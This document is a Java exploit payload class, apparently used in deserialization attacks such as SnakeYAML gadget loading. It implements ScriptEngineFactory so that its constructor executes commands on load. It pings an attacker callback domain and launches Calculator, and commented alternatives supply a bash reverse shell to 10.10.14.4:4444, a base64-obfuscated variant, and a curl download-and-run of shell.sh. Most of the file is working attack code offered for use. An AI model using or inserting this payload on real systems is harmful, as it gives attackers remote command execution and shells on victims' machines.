package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /*
     * Additional payload examples - replace the constructor above with one of these:
     *
     * Example 1 - Reverse shell payloads:
     *
     * public AwesomeScriptEngineFactory() {
     *     String [] cmd={"bash","-c","bash -i >& /dev/tcp/10.10.14.4/4444 0>&1"};
     *     String [] jex={"bash","-c","{echo,$(echo -n $cmd | base64)}|{base64,-d}|{bash,-i}"};
     *     try {
     *         Runtime.getRuntime().exec(cmd);
     *         Runtime.getRuntime().exec(jex);
     *         Runtime.getRuntime().exec("echo $jex");
     *     } catch (IOException e) {
     *         e.printStackTrace();
     *     }
     * }
     *
     * Example 2 - Download and execute payload:
     * (Note: add the RunCmd method below to the class when using this)
     *
     * public AwesomeScriptEngineFactory() {
     *     RunCmd("curl 10.10.14.4/shell.sh -o /tmp/shell.sh");
     *     RunCmd("bash /tmp/shell.sh");
     * }
     *
     * public String RunCmd(String Cmd) {
     *     try {
     *         Runtime.getRuntime().exec(Cmd);
     *     } catch (IOException e) {
     *         e.printStackTrace();
     *     }
     *     return null;
     * }
     */

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
